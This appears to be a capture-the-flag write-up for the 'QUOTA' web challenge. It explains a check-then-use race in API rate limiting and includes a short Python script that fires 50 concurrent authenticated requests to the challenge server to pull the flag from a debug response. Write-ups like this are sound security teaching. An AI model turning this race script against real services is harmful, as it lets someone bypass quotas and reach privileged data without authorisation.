---
layout: page
title: "QUOTA - Google CTF 2025 Writeup"
subtitle: "Race condition in API quota enforcement allows exceeding rate limits and triggering a privileged code path that leaks the flag from a server-side object store."
permalink: /ctf/writeups/challenges/web/quota/
category: "web"
challenge_name: "QUOTA"
difficulty: "Hard"
event: "Google CTF 2025"
points: "492"
solves: "14"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: Google CTF 2025
* **Difficulty**: Hard
* **Points**: 492
* **Solves**: 14
* **Category**: Web
* **Tags**: Race Condition, API Abuse, Timing Attack

---

## 📝 Description
Race condition in API quota enforcement allows exceeding rate limits and triggering a privileged code path that leaks the flag from a server-side object store.

---

## 💡 Solution / Approach
1. Identify the quota check: `GET /api/resource` validates rate limit before serving data.

2. Race 50 simultaneous requests within one second using Python's `asyncio`.

3. The server's check-then-use gap (TOCTOU) allows ~3 requests past the limit.

4. At 3x over-quota, the server falls back to a debug response containing the flag.

```python
import asyncio, httpx

async def race():
    async with httpx.AsyncClient() as c:
        tasks = [c.get("https://quota.ctf.google.com/api/resource", 
                        headers={"Cookie": "session=YOURTOKEN"}) 
                 for _ in range(50)]
        results = await asyncio.gather(*tasks)
        for r in results:
            if "CTF{" in r.text:
                print(r.text)

asyncio.run(race())
```
